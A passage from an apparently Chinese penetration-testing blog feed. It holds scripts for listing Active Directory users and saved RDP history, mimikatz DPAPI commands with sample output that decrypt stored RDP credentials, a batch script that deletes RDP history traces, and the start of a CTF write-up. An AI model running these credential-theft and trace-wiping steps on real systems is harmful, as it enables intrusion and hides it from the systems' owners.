= true;</span><br><span class="line">            System.Diagnostics.Process proc = new System.Diagnostics.Process &#123; StartInfo = proccessStartInfo &#125;;</span><br><span class="line"></span><br><span class="line">            proc.StartInfo.RedirectStandardOutput = true; // 由调用程序获取输出信息</span><br><span class="line">            proc.StartInfo.UseShellExecute = false; // 是否使用操作系统shell启动</span><br><span class="line">            proc.StartInfo.CreateNoWindow = true; // 不显示程序窗口</span><br><span class="line">            proc.Start();  // 启动程序</span><br><span class="line"></span><br><span class="line">            string outlist = proc.StandardOutput.ReadToEnd(); // 获取cmd窗口的输出信息</span><br><span class="line"></span><br><span class="line">            Regex reg = new Regex(&quot;.*ame.*&quot;);</span><br><span class="line">            MatchCollection result = reg.Matches(outlist);</span><br><span class="line">            Console.WriteLine(&quot;============================================================&quot;);</span><br><span class="line">            foreach (Match match in result)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(match);</span><br><span class="line">            &#125;</span><br><span class="line">            proc.WaitForExit(); // 等待程序执行完退出进程</span><br><span class="line">            proc.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果图：</p><p><img src="/image/域-批量Net-User/1.png" alt=""></p><h2 id="0x02-改进-20190418"><a href="#0x02-改进-20190418" class="headerlink" title="0x02 改进 (20190418)"></a>0x02 改进 (20190418)</h2><p>由于上面的代码略蠢，所以我决定将它进行改进。</p><ul><li>使用 <code>System.DirectoryServices.ActiveDirectory</code> 列举用户；</li><li><p>使用 <code>msvcrt.dll</code> 执行系统命令；</p><p>​</p></li></ul><h3 id="1-powershell-列举用户列表"><a href="#1-powershell-列举用户列表" class="headerlink" title="1) powershell 列举用户列表"></a>1) powershell 列举用户列表</h3><p>这份代码在网上已经很成熟了，可自行查阅。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> DomainUserList</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取当前 Domain 值</span></span><br><span class="line"><span class="variable">$DomainObject</span> =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line">    <span class="variable">$CurrentDomain</span> = <span class="string">"LDAP://"</span> + ([ADSI]<span class="string">""</span>).distinguishedName</span><br><span class="line"></span><br><span class="line">    <span class="variable">$UserSearcher</span> = <span class="built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([ADSI]<span class="variable">$CurrentDomain</span>)</span><br><span class="line">    <span class="variable">$DirEntry</span> = <span class="built_in">New-Object</span> System.DirectoryServices.DirectoryEntry</span><br><span class="line">    <span class="variable">$UserSearcher</span>.SearchRoot = <span class="variable">$DirEntry</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="variable">$lockoutThreshold</span> = [int]<span class="variable">$DirEntry</span>.lockoutThreshold.Value</span><br><span class="line">    <span class="built_in">Write-Host</span> -ForegroundColor <span class="string">"yellow"</span> <span class="string">"[*] 当前域的锁定阈值是 $(<span class="variable">$lockoutThreshold</span>)."</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$minPwdLength</span> = [int]<span class="variable">$DirEntry</span>.minPwdLength.Value</span><br><span class="line">    <span class="built_in">Write-Host</span> -ForegroundColor <span class="string">"yellow"</span> <span class="string">"[*] 当前域的最小密码长度是 $(<span class="variable">$minPwdLength</span>)."</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除已禁用的用户列表</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$RemoveDisabled</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 参考资料：http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/ </span></span><br><span class="line">        <span class="built_in">Write-Host</span> -ForegroundColor <span class="string">"yellow"</span> <span class="string">"[*] 从列表中删除已禁用的用户."</span></span><br><span class="line">        <span class="variable">$UserSearcher</span>.filter = <span class="string">"(&amp;(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2))"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$UserSearcher</span>.filter = <span class="string">"(&amp;(objectCategory=person)(objectClass=user))"</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 在结果中抓取1000次</span></span><br><span class="line">    <span class="variable">$UserSearcher</span>.PageSize = <span class="number">100</span></span><br><span class="line">    <span class="variable">$AllUserObjects</span> = <span class="variable">$UserSearcher</span>.FindAll()</span><br><span class="line">    <span class="built_in">Write-Host</span> -foregroundcolor <span class="string">"yellow"</span> (<span class="string">"[*] 从当前 AD 域中成功收集了 "</span> + <span class="variable">$AllUserObjects</span>.count + <span class="string">" 个用户"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$AllUserObjects</span>.Properties.samaccountname</span><br><span class="line">&#125;</span><br><span class="line">DomainUserList</span><br></pre></td></tr></table></figure><p><img src="/image/域-批量Net-User/blog_2019-04-18_14-19-28.png" alt=""></p><p>将代码转换成C#代码，效果如下</p><p><img src="/image/域-批量Net-User/blog_2019-04-18_15-05-37.png" alt=""></p><h3 id="3-成品"><a href="#3-成品" class="headerlink" title="3) 成品"></a>3) 成品</h3><p>其实还是有点麻瓜。</p><p>github: <a href="https://github.com/RcoIl/CSharp_Tools/tree/master/DomainUserList" target="_blank" rel="noopener">DomainUserList</a></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>在域内使用<code>dsquery</code>查找的信息是有限的，所以需要相应的辅助工具，这个工具存在的意义就是人物与域用户之间的确认。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;域内批量执行 &lt;code&gt;net user Uname /domain&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>关于windows的RDP连接记录</title>
    <link href="https://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/"/>
    <id>https://rcoil.me/2018/05/关于windows的RDP连接记录/</id>
    <published>2018-05-12T03:13:20.000Z</published>
    <updated>2018-11-30T10:29:24.752Z</updated>
    
    <content type="html"><![CDATA[<p>关于windows的RDP连接历史记录处理，此处仅作为笔记记录，并非原创。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>每次成功连接到远程主机时，RDP客户端都会保存远程主机的名称（或IP地址）以及用于登陆的用户名。再次启动<code>mstsc.exe</code>时，可以直接从列表中选择远程RDP服务器的名称，并且客户端已自动填写用于登陆的用户名。</p><p>从安全角度来讲，这是极不安全的。</p><h2 id="0x01-获取RDP连接历史记录"><a href="#0x01-获取RDP连接历史记录" class="headerlink" title="0x01 获取RDP连接历史记录"></a>0x01 获取RDP连接历史记录</h2><p>至于获得历史记录的思路及细节实现思路，请转至<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">三好学生</a>师傅的博客，此处仅作为记录。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment">This script will list the logged-in users' RDP Connections History.</span></span><br><span class="line"><span class="comment">Author: 3gstudent@3gstudent</span></span><br><span class="line"><span class="comment">License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"><span class="variable">$AllUser</span> = <span class="built_in">Get-WmiObject</span> -Class Win32_UserAccount</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$User</span> <span class="keyword">in</span> <span class="variable">$AllUser</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$RegPath</span> = <span class="string">"Registry::HKEY_USERS\"</span>+<span class="variable">$User</span>.SID+<span class="string">"\Software\Microsoft\Terminal Server Client\Servers\"</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"User:"</span><span class="variable">$User</span>.Name</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"SID:"</span><span class="variable">$User</span>.SID</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"Status:"</span><span class="variable">$User</span>.Status</span><br><span class="line"><span class="keyword">Try</span>  </span><br><span class="line">    &#123; </span><br><span class="line"><span class="variable">$QueryPath</span> = dir <span class="variable">$RegPath</span> -Name -ErrorAction Stop</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">Catch</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"No RDP Connections History"</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"----------------------------------"</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$Name</span> <span class="keyword">in</span> <span class="variable">$QueryPath</span>)</span><br><span class="line">&#123;   </span><br><span class="line"><span class="keyword">Try</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">    <span class="variable">$User</span> = (<span class="built_in">Get-ItemProperty</span> -Path <span class="variable">$RegPath</span><span class="variable">$Name</span> -ErrorAction Stop).UsernameHint</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">"User:"</span><span class="variable">$User</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">"Server:"</span><span class="variable">$Name</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">Catch</span>  </span><br><span class="line">    &#123;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"No RDP Connections History"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">"----------------------------------"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据三好学生师傅的PowerShell改写了C#版本，虽然代码不怎么好看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using Microsoft.Win32;</span><br><span class="line"></span><br><span class="line">namespace SavedRDPConnections</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        public static string GetRegValue(string hive, string path, string value)</span><br><span class="line">        &#123;</span><br><span class="line">            string regKeyValue = &quot;&quot;;</span><br><span class="line">            if (hive == &quot;HKCU&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                var regKey = Registry.CurrentUser.OpenSubKey(path);</span><br><span class="line">                if (regKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value));</span><br><span class="line">                &#125;</span><br><span class="line">                return regKeyValue;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (hive == &quot;HKU&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                var regKey = Registry.Users.OpenSubKey(path);</span><br><span class="line">                if (regKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value));</span><br><span class="line">                &#125;</span><br><span class="line">                return regKeyValue;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                var regKey = Registry.LocalMachine.OpenSubKey(path);</span><br><span class="line">                if (regKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value));</span><br><span class="line">                &#125;</span><br><span class="line">                return regKeyValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static string[] GetRegSubkeys(string hive, string path)</span><br><span class="line">        &#123;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                Microsoft.Win32.RegistryKey myKey = null;</span><br><span class="line">                if (hive == &quot;HKLM&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    myKey = Registry.LocalMachine.OpenSubKey(path);</span><br><span class="line">                &#125;</span><br><span class="line">                else if (hive == &quot;HKU&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    myKey = Registry.Users.OpenSubKey(path);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    myKey = Registry.CurrentUser.OpenSubKey(path);</span><br><span class="line">                &#125;</span><br><span class="line">                String[] subkeyNames = myKey.GetSubKeyNames();</span><br><span class="line">                return myKey.GetSubKeyNames();</span><br><span class="line">            &#125;</span><br><span class="line">            catch</span><br><span class="line">            &#123;</span><br><span class="line">                return new string[0];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static void ListSavedRDPConnections()</span><br><span class="line">        &#123;</span><br><span class="line">            string[] SIDs = Registry.Users.GetSubKeyNames();</span><br><span class="line">            foreach (string SID in SIDs)</span><br><span class="line">            &#123;</span><br><span class="line">                if (SID.StartsWith(&quot;S-1-5&quot;) &amp;&amp; !SID.EndsWith(&quot;_Classes&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                    string[] subkeys = GetRegSubkeys(&quot;HKU&quot;, String.Format(&quot;&#123;0&#125;\\Software\\Microsoft\\Terminal Server Client\\Servers&quot;, SID));</span><br><span class="line">                    if (subkeys != null)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(&quot;\r\n\r\n=== Saved RDP Connection Information (&#123;0&#125;) ===&quot;, SID);</span><br><span class="line">                        foreach (string host in subkeys)</span><br><span class="line">                        &#123;</span><br><span class="line">                            string username = GetRegValue(&quot;HKCU&quot;, String.Format(&quot;Software\\Microsoft\\Terminal Server Client\\Servers\\&#123;0&#125;&quot;, host), &quot;UsernameHint&quot;);</span><br><span class="line">                            Console.WriteLine(&quot;\r\n  Server : &#123;0&#125;&quot;, host);</span><br><span class="line">                            if (username != &quot;&quot;)</span><br><span class="line">                            &#123;</span><br><span class="line">                                Console.WriteLine(&quot;  User   : &#123;0&#125;&quot;, username);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            ListSavedRDPConnections();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/image/关于windows的RDP连接记录/blog_2018-11-30_18-25-46.png" alt=""></p><h2 id="0x02-破解RDP连接凭证"><a href="#0x02-破解RDP连接凭证" class="headerlink" title="0x02 破解RDP连接凭证"></a>0x02 破解RDP连接凭证</h2><p>破解RDP连接凭证的前提是用户在连接远程主机时勾选了保存保存凭证。</p><p><img src="/image/关于windows的RDP连接记录/1.png" alt=""></p><h3 id="1、查找本地的Credentials"><a href="#1、查找本地的Credentials" class="headerlink" title="1、查找本地的Credentials"></a>1、查找本地的Credentials</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure><p><img src="/image/关于windows的RDP连接记录/2.png" alt=""></p><h3 id="2、使用mimikatz进行操作"><a href="#2、使用mimikatz进行操作" class="headerlink" title="2、使用mimikatz进行操作"></a>2、使用mimikatz进行操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6</span><br></pre></td></tr></table></figure><p>得到的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6</span><br><span class="line">**BLOB**</span><br><span class="line">  dwVersion          : 00000001 - 1</span><br><span class="line">  guidProvider       : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;</span><br><span class="line">  dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">  guidMasterKey      : &#123;ffc994a1-de8d-4304-9416-31e587f7a8ca&#125;</span><br><span class="line">  dwFlags            : 20000000 - 536870912 (system ; )</span><br><span class="line">  dwDescriptionLen   : 00000030 - 48</span><br><span class="line">  szDescription      : Local Credential Data</span><br><span class="line"></span><br><span class="line">  algCrypt           : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">  dwAlgCryptLen      : 00000100 - 256</span><br><span class="line">  dwSaltLen          : 00000020 - 32</span><br><span class="line">  pbSalt             : 00fed8ca7ec6d44585dd1fbd8b57e77b6ab0cf318ec5d52d09fd0694ffb89ccb</span><br><span class="line">  dwHmacKeyLen       : 00000000 - 0</span><br><span class="line">  pbHmackKey         :</span><br><span class="line">  algHash            : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">  dwAlgHashLen       : 00000200 - 512</span><br><span class="line">  dwHmac2KeyLen      : 00000020 - 32</span><br><span class="line">  pbHmack2Key        : b49ef55f909fa503eda37ddc797c83c99df983920bfb4628e07aac5cb32bb530</span><br><span class="line">  dwDataLen          : 000000b0 - 176</span><br><span class="line">  pbData             : 4083f8f501b999a35c4aa57ce732bf52d30a6e604dac5a91b6fd3e65660c52a536025c5126f0d12b85044498deef08a8688b3459f49514ed6ae46271a1cb4cd0e70845d9b6beccbcbe85dead0fb7c80b4f7810add87b75c48592fcbfbbfd94fa4eee8004f8cf6d9619ef4b9af643f4c9ef0e8a2a5b0cd00530a5638cfd114fee4b735ac12eef2c7e6a0364845eb0ee4b3ab121e33324f8d5af48f3422bd47a76ab5e9e9e5a1a383e22fff8bf851b6a2a</span><br><span class="line">  dwSignLen          : 00000040 - 64</span><br><span class="line">  pbSign             : 7c8dbe7991c6af4d3bfc9f808790a0904738d0ca227bc2ee20ee26cbf06487dd2679e932b27ea0c0cbbe590ee6430641605d7001b2158c8873c5d6a09a9855a8</span><br></pre></td></tr></table></figure><p>接下来需要使用的就是<code>guidMasterKey</code>、<code>pbData</code>数据。<strong>pbData是凭据的加密数据，guidMasterKey是凭据的GUID</strong></p><h3 id="3、使用sekurlsa-dpapi"><a href="#3、使用sekurlsa-dpapi" class="headerlink" title="3、使用sekurlsa::dpapi"></a>3、使用sekurlsa::dpapi</h3><p><img src="/image/关于windows的RDP连接记录/3.png" alt=""></p><p>根据目标凭据<code>GUID: {ffc994a1-de8d-4304-9416-31e587f7a8ca}</code>找到其关联的<code>MasterKey</code>，这个<code>MasterKey</code>就是加密凭据的密钥，即<code>解密pbData</code>所必须的东西。</p><h3 id="4、解密"><a href="#4、解密" class="headerlink" title="4、解密"></a>4、解密</h3><p>命令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6 /masterkey:e01320a53bf9d57da1163c7723a5b3901df5a3fc8e504fc021def2637d19d34c0084a3ac2a0daab3fb9af3f98c48a9a901627dc4b10db087cb357e1d2f8aa18c</span><br></pre></td></tr></table></figure><p><img src="/image/关于windows的RDP连接记录/4.png" alt=""></p><h2 id="0x03-清除RDP连接历史记录"><a href="#0x03-清除RDP连接历史记录" class="headerlink" title="0x03 清除RDP连接历史记录"></a>0x03 清除RDP连接历史记录</h2><p>清除就相对简单一些。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:\Software\Microsoft\Terminal Server Client\</span><br></pre></td></tr></table></figure><p>针对上述的<code>Default</code>、<code>Server</code>，对其表项进行删除</p><p><img src="/image/关于windows的RDP连接记录/5.png" alt=""></p><p>tips：由于在删除<code>Server表项</code>的时候无法一次选择所有表项，因为可以直接删除<code>整个Server</code>再新建。</p><p>除了删除注册表之外，要需要删除默认的RDP连接文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f # 删除Default中的所有值</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /f # 删除整个Servers</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; 重新创建删除的注册表项</span><br><span class="line">cd %userprofile%\documents\ # 转到Default.rdp文件目录</span><br><span class="line">attrib Default.rdp -s -h # 更改Default.rdp文件属性，默认情况下它是隐藏</span><br><span class="line">del Default.rdp  # 删除文件Default.rdp文件</span><br></pre></td></tr></table></figure><p>注意：在某些情况（比如系统盘空间不足）下，<code>Document</code>文件夹会从<code>%userprofile%\documents\</code>移动，所以特殊情况下，需要手动查找<code>Default.rdp</code></p><h2 id="0x04参考"><a href="#0x04参考" class="headerlink" title="0x04参考"></a>0x04参考</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">获得Windows系统的远程桌面连接历史记录</a></p><p><a href="http://www.ansbase5.info/?p=535" target="_blank" rel="noopener">mimikatz获取本地Credentials</a></p><p><a href="https://www.t00ls.net/articles-41926.html#" target="_blank" rel="noopener">破解远程终端凭据，获取服务器密码</a></p><p><a href="http://woshub.com/how-to-clear-rdp-connections-history/#h2_3" target="_blank" rel="noopener">How to Clear RDP Connections History in Windows</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于windows的RDP连接历史记录处理，此处仅作为笔记记录，并非原创。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="系统安全,内网" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>ISCC-2018</title>
    <link href="https://rcoil.me/2018/05/ISCC-2018/"/>
    <id>https://rcoil.me/2018/05/ISCC-2018/</id>
    <published>2018-05-01T13:11:29.000Z</published>
    <updated>2018-05-25T15:04:13.658Z</updated>
    
    <content type="html"><![CDATA[<p>又一年，不过今年的质量有些…..</p><a id="more"></a><h2 id="0x01Misc"><a href="#0x01Misc" class="headerlink" title="0x01Misc"></a>0x01Misc</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>附件地址：<a href="https://pan.baidu.com/s/1RFKBXgMtT4uF-MZ5gDQf9w" target="_blank" rel="noopener">What is that</a></p><p>查看图片信息，使用传统的方法解答没见效，使用<code>TweakPNG</code>查看图片信息。</p><p><img src="/image/ISCC-2018/MISC1-1.png" alt=""></p><p>将高度调整即可得到flag。</p><p><img src="/image/ISCC-2018/MISC1.png" alt=""></p><h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p>查看附件，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">秘密电报：</span><br><span class="line">知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</span><br></pre></td></tr></table></figure><p>老司机一看就是培根密码了，flag为：<code>ILIKEISCC</code></p><h3 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h3><p>附件地址：<a href="https://pan.baidu.com/s/18ABDPnRwb0TrRezILokaQQ" target="_blank" rel="noopener">Where is the FLAG</a></p><p>题目：不只是Logo</p><p>查看详细信息，发现是由<code>Adobe Fireworks CS5</code>保存出来的图片，那就用<code>Adobe Fireworks CS5</code>打开。</p><p><img 